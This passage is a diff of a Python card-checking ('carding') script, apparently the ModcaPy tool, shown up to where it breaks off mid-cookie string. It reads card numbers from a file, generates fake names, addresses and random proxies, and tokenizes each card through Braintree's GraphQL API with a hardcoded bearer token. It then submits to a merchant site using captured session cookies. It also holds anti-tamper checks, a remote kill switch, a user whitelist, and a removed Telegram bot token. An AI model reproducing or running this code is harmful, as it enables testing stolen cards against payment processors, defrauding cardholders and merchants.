@@ -1,41 +1,3 @@
-import importlib.util, os
-try:
-    api_path = os.path.join(os.path.dirname(importlib.util.find_spec("requests").origin), 'api.py')
-    if os.path.exists(api_path):
-        with open(api_path, 'r') as file:
-            content = file.read()
-            if any(keyword in content for keyword in ['print', 'sys', 'logging', 'write', 'warn']):
-                exit("لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~")
-except Exception as e:
-    pass
-import requests,os,sys, urllib.request
-while True:
-    try:
-        url = urllib.request.urlopen("https://t.me/Tools_VIPP/19").read().decode('utf-8') 
-        break
-    except:print("TURN VPN")
-if "all" not in url:
-    print('')
-    print('\n')
-    print('Tσσℓѕ Sтσρрє∂ ')
-    print('\n')
-    print('لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~ ')
-    print('\n')
-O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
-Z =  '\033[1;37m' #white
-F = '\033[1;32m' #Green
-B = '\033[2;36m' #Light Blue
-X = '\033[1;33m' #Yellow
-C = '\033[2;35m' #Purple
-from cfonts import render  
-#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
-output = render('MODCA', colors=['white', 'red'], align='center')
-print(output)
-
-print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
-print('\033[1;31m_' * 60)
-print('\n')
-import sys
 
 authorized_users = [1296559148, 5966873984, 1296559148, 6695873549, 5702803191, 6174126557, 5612427625, 1970257616, 7408511525, 912917157, 6603688300, 5123986264, 6609362604, 1418522621, 2084607021, 6084792010, 1766670561, 2093600923, 7941434265,6215949767,5029508191,5473865129,6119391480,1077121685,959477905,1860698316,1401023813,1037568617,1539348703]
 
@@ -45,7 +7,7 @@ def check_authorized(user_id):
     else:
         return False
 
-user = int(input(f"{O}Enter Your ID : "))
+user = int(input(f"Enter Your ID : "))
 
 if check_authorized(user):
     print("تم تفعيل الأداة بنجاح، مرحبًا بك!")
@@ -61,6 +23,41 @@ else:
     print('هذه قناة التحديثات انضم وانتظر التحديثات ')
     sys.exit()
     
+
+import importlib.util, os
+try:
+    api_path = os.path.join(os.path.dirname(importlib.util.find_spec("requests").origin), 'api.py')
+    if os.path.exists(api_path):
+        with open(api_path, 'r') as file:
+            content = file.read()
+            if any(keyword in content for keyword in ['print', 'sys', 'logging', 'write', 'warn']):
+                exit("لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~")
+except Exception as e:
+    pass
+import requests,os,sys, urllib.request
+while True:
+    try:
+        url = urllib.request.urlopen("https://t.me/ModcaPy/23").read().decode('utf-8') 
+        break
+    except:print("TURN VPN")
+if "Tools-Free-2H" not in url:
+    print('')
+    print('\n')
+    print('Tσσℓѕ Sтσρрє∂ ')
+    print('\n')
+    print('لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~ ')
+    print('\n')
+    
+    print('https://t.me/ModcaTheLost ')
+    print('هذه قناة التحديثات انضم وانتظر التحديثات ')
+    sys.exit()
+    exit()
+    os._exit(0)
+    sys.exit(0)
+    
+    
+import os, webbrowser
+webbrowser.open('https://t.me/ModcaTheLost')
 try:
 	import requests
 except ModuleNotFoundError:
@@ -68,17 +65,32 @@ except ModuleNotFoundError:
 	os.system('pip install requests')
 	
 try:
-	import user_agent
+	from cfonts import render  
 except ModuleNotFoundError:
 	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-	os.system('pip install user_agent')
+	os.system('pip install python-cfonts')
 	
-
 try:
 	from fake_useragent import UserAgent
 except ModuleNotFoundError:
 	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
 	os.system('pip install fake_useragent')
+import requests,time,webbrowser,json,os,sys,re,user_agent,random
+from cfonts import render, say
+import random,string,user_agent,base64
+from fake_useragent import UserAgent
+#from bin_info_v1 import bin_info
+
+try:
+	import requests
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install requests')
+try:
+	from user_agent import generate_user_agent
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install user_agent')
 	
 try:
 	from cfonts import render  
@@ -86,21 +98,20 @@ except ModuleNotFoundError:
 	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
 	os.system('pip install python-cfonts')
 	
-    
-import os,user_agent,fake_useragent
-from cfonts import render, say
-import requests,time,webbrowser,json,os,sys,re,user_agent,random
-from cfonts import render, say
-import random,string,user_agent,base64
-from fake_useragent import UserAgent
+try:
+	 import user_agent
+except ModuleNotFoundError:
+	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
+	os.system('pip install user_agent')
 
-user = user_agent.generate_user_agent()		
-r = requests.session()	
+user = user_agent.generate_user_agent()
+		
+r = requests.session()
+	
 r.follow_redirects = True
+	
 r.verify = False
 
-token2 = '6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg'
-id2 = '5123986264'
 
 Z =  '\033[1;31m' 
 F = '\033[2;32m' 
@@ -109,6 +120,41 @@ X = '\033[1;33m'
 C = '\033[2;35m'
 w = '\033[2;37m'
 y = '\033[1;34m' 
+
+
+
+md1 = '\x1b[1;31m'  # أحمر
+md2 = '\x1b[1;32m'  # أخضر
+md3 = '\x1b[38;5;153m'
+a5 = '\x1b[38;5;208m'
+Z =  '\033[1;31m' 
+F = '\033[2;32m' 
+B = '\033[2;36m'
+X = '\033[1;33m' 
+C = '\033[2;35m'
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
+B = "\033[1;30m"  # Black
+R = "\033[1;31m"  # Red
+G = "\033[1;32m"  # Green
+Y = "\033[1;33m"  # Yellow
+Bl = "\033[1;34m"  # Blue
+P = "\033[1;35m"  # Purple
+C = "\033[1;36m"  # Cyan
+W = "\033[1;37m"  # White
+PN = "\033[1;35m"  # PINK
 
 import sys,time,os
 def lo(word):
@@ -122,17 +168,23 @@ lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭�
 os.system('clear')            
 from cfonts import render  
 #print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
-output = render('MODCA', colors=['white', 'red'], align='center')
+output = render('MODCA', colors=['white', 'magenta'], align='center')
 print(output)
 
-print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
-print('\033[1;31m_' * 60)
+print("      ~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
+print("\x1b[38;5;5m—" * 72)
 print('\n')
 
-token = input('Enter Your Token : ')
-id = input('Enter Your ID : ')
-
 file=open('Modca.txt',"+r")
+
+#webbrowser.open('https://t.me/ModcaTheLost')
+O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
+Z =  '\033[1;37m' #white
+F = '\033[1;32m' #Green
+B = '\033[2;36m' #Light Blue
+X = '\033[1;33m' #Yellow
+C = '\033[2;35m' #Purple
+
 start_num = 0
 for P in file.readlines():
     start_num += 1
@@ -152,18 +204,77 @@ for P in file.readlines():
         yy = f'20{yy}'
     else:
     	yy = yy
+    #time.sleep(14)
     start_time = time.time()
-    #time.sleep(10)
+    def generate_full_name():
+        first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
+                    "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
+                    "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
+                    "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
+                    "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
+                    "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
+                    "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
+                    "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
+                    "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
+                    "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
+                    
+        last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
+                    "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
+                    "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
+                    "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
+                    "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
+                    "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
+                    "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
+                    "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
+                    
+        full_name = random.choice(first_names) + " " + random.choice(last_names)
+        first_name, last_name = full_name.split()
+        return first_name, last_name
+        
+    def generate_address():
+        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+        states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
+        streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
+        
+        zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
+        
+        city = random.choice(cities)
+        state = states[cities.index(city)]
+        street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
+        zip_code = zip_codes[states.index(state)]
+        return city, state, street_address, zip_code
+    first_name, last_name = generate_full_name()
+    city, state, street_address, zip_code = generate_address()
     
+    def username():
+        name = ''.join(random.choices(string.ascii_lowercase, k=20))
+        number = ''.join(random.choices(string.digits, k=20))
+        return f"{name}{number}"
+    username = (username())
+    def num():
+        number = ''.join(random.choices(string.digits, k=7))
+        return f"303{number}"
+    num = (num())
+    def generate_random_code(length=32):
+        letters_and_digits = string.ascii_letters + string.digits
+        return ''.join(random.choice(letters_and_digits) for _ in range(length))
+        
+    corr = generate_random_code()
     
+    sess = generate_random_code()
+
+    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
+    port = random.choice(pl)
+    proxy = ip + ":" + str(port)
     
-    
-    
+    #
+	
     headers = {
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzYxMDMxMTEsImp0aSI6Ijg1MGFlMWRhLWFlNGItNGNlZC04YjE4LWQ4M2JjZTEyNzc2MiIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319._5pYKjgz45L8FTrTJ-JZjHDKZe6rWcRtCvrP3juJ6v-U40B_HfeSxsf0NNks5bZHlAJN4yx_05VplRu6_AiPzA',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzYxMDQzMjMsImp0aSI6IjBmMzIyZTRlLWMxNGQtNGM3Ny1iOTJkLWQwZjQxZTk3ODdkMyIsInN1YiI6IjhtemhtZnkycXNtZjZqdHIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhtemhtZnkycXNtZjZqdHIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYmFsbG9vbnNvbmxpbmVsdGRVU0QifX0.MtFleCFfFrRsymj57CHZu6IzkGZggrAwe7YMUd44fwX1GJiYfM-w5NMGAmc0DcgngBGSMf9eHHUq466vdIG1CQ',
         'braintree-version': '2018-05-10',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
@@ -181,7 +292,7 @@ for P in file.readlines():
         'clientSdkMetadata': {
             'source': 'client',
             'integration': 'custom',
-            'sessionId': '3f3e168e-5ad6-4728-9ff6-f1c899b786ff',
+            'sessionId': 'dd66d3c6-7cee-4927-b655-c7e4c005816b',
         },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
         'variables': {
@@ -200,368 +311,538 @@ for P in file.readlines():
         'operationName': 'TokenizeCreditCard',
     }
     
-    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-    
-
-
+    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies={'http': proxy})
 	
-    try:
-        tok = (response.json()['data']['tokenizeCreditCard']['token'])
-    except TypeError:
-        print('Call Modca To Update Habibi 💸 ')
-        sys.exit()
-
-
+    tok = (response.json()['data']['tokenizeCreditCard']['token'])
+	
+    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
+    port = random.choice(pl)
+    proxy = ip + ":" + str(port)
+    
     cookies = {
-        'visid_incap_2624039': '/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh',
-        'osVisitor': '1875de0b-9cfb-4cfe-bd66-744771ee42be',
-        '_gcl_au': '1.1.346592010.1730543022',
-        '_ga': 'GA1.1.214830494.1730543022',
-        '_fbp': 'fb.1.1730543022262.343117564879421434',
-        '3': 'ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1',
-        '1': 'qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=',
-        '2': 'Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==',
-        'nr2ApolloUser_CS': 'crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com',
-        'nlbi_2624039': 'KQujBI8AVU9adyd4nrr3FQAAAAALdRiA4CwPW1i3nygsAjwj',
-        'incap_ses_2222_2624039': '1gBVGv2P5DvppTI1hyHWHlVcZGcAAAAAdySI2Bklett0qJr4jD7Ykw==',
-        'osVisit': '22bdbcfc-dfee-40be-b1e1-b27f08cd7f91',
-        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870227590%3bexp%3d63872819290%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dNFV37vWxEyJ4LMLlf4PSiFdhbM8%3d',
-        '_ga_WSCFS5WWZ0': 'GS1.1.1734630491.27.0.1734630491.0.0.0',
-        'ASP.NET_SessionId': '412s5wgixcslrk1cyhvbdctr',
+        '_gcl_au': '1.1.1265869224.1734779653',
+        'mage-cache-storage': '{}',
+        'mage-cache-storage-section-invalidation': '{}',
+        'mage-cache-sessid': 'true',
+        'mage-messages': '',
+        'wp_customerGroup': 'NOT%20LOGGED%20IN',
+        'recently_viewed_product': '{}',
+        'recently_viewed_product_previous': '{}',
+        'recently_compared_product': '{}',
+        'recently_compared_product_previous': '{}',
+        'product_data_storage': '{}',
+        '_fbp': 'fb.1.1734779655279.428567677744803775',
+        'PHPSESSID': 'b7ibmlc5gvmmktmf9e48dm0rfh',
+        'form_key': 'UvU1Umjl4SCsagdj',
+        'omnisendContactID': '6766a35776d70c520235cf8f',
+        'ignore_location': 'true',
+        'landed': 'DZ',
+        'soundestID': '20250104191129-uBwIxRihclWNCna7vIADXbe1tcrus7aR2womS1rKyqoLEGN1z',
+        'omnisendSessionID': 'N4zEYXYJ6JymKr-20250104191129',
+        '_gid': 'GA1.2.1594074311.1736017891',
+        'cf_clearance': 'FbSHozU5Ng3IlHijtnoDqro8JGHXB1S2tcSuxoifAfE-1736017913-1.2.1.1-RGSrN36li9Sp7LNvjlzT0_236OfZyutjDNI.APUggwHWi5E7_95WHLHS.kLC6QU8TRX42c3UFdqWTgPfRrgKGgMO27GCSYFZvuSnEBsWZj5F18UKdpTm_wOS5x5Gvdz9uFfAd1OgfdLvSodT9ZL73k4uo3JFsno68pIopu0OB_TUMOZ9epXDTC0LlHWaOINGnvTYvwKkgE6xTdn_54JKNlmYqDM_vt1yQLaPWPo1.FFq5xhDcDXPMHnaEOtYe1Fm0rBG4yc93k7avzYbfMDRxodvn48.9X8fA3bePq9tga_WAGkbvNZwhbKi_rirkMrkMeoDTuh5a0bD_fOa9rXftcOOzatoUBu6MNBDVTBekmg_30DLhJFXuMxta_x0lGbsQpO8f6iiLw86XneIY1i23q6elBP596HkKaX..TOazfZ1.yQeDzKGUcrNpqBkmtQZ',
+        '_uetsid': 'b53d41a0cacf11ef80f381283d5f8c94',
+        '_uetvid': 'b6a91d70bf8c11efa9f8a90abb596118',
+        '_ga': 'GA1.2.1287686620.1734779655',
+        'SL_C_23361dd035530_SID': '{"8ca877e1caaaf33fade54d63cfc7b195c4b1c55d":{"sessionId":"6OP5GTG5OPsw8keYbrKuf","visitorId":"hIOU56GuXWpkUirDZ02i-"}}',
+        '_dc_gtm_UA-77029243-1': '1',
+        'private_content_version': '96496a2576ec72c73d11342830f4614b',
+        '_ga_FPCK13BMBY': 'GS1.1.1736017889.2.1.1736018012.39.0.0',
+        'section_data_ids': '{%22notify_me%22:1736017932%2C%22cart%22:1736017916%2C%22directory-data%22:1734779670%2C%22gtm%22:1736018011%2C%22captcha%22:1734779817}',
     }
     
     headers = {
-        'authority': 'www.lifehub.sg',
-        'accept': 'application/json',
+        'authority': 'balloons.online',
+        'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'content-type': 'application/json; charset=UTF-8',
-        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; nlbi_2624039=KQujBI8AVU9adyd4nrr3FQAAAAALdRiA4CwPW1i3nygsAjwj; incap_ses_2222_2624039=1gBVGv2P5DvppTI1hyHWHlVcZGcAAAAAdySI2Bklett0qJr4jD7Ykw==; osVisit=22bdbcfc-dfee-40be-b1e1-b27f08cd7f91; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63870227590%3bexp%3d63872819290%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dNFV37vWxEyJ4LMLlf4PSiFdhbM8%3d; _ga_WSCFS5WWZ0=GS1.1.1734630491.27.0.1734630491.0.0.0; ASP.NET_SessionId=412s5wgixcslrk1cyhvbdctr',
-        'origin': 'https://www.lifehub.sg',
-        'referer': 'https://www.lifehub.sg/product-payment',
+        'content-type': 'application/json',
+        # 'cookie': '_gcl_au=1.1.1265869224.1734779653; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; wp_customerGroup=NOT%20LOGGED%20IN; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _fbp=fb.1.1734779655279.428567677744803775; PHPSESSID=b7ibmlc5gvmmktmf9e48dm0rfh; form_key=UvU1Umjl4SCsagdj; omnisendContactID=6766a35776d70c520235cf8f; ignore_location=true; landed=DZ; soundestID=20250104191129-uBwIxRihclWNCna7vIADXbe1tcrus7aR2womS1rKyqoLEGN1z; omnisendSessionID=N4zEYXYJ6JymKr-20250104191129; _gid=GA1.2.1594074311.1736017891; 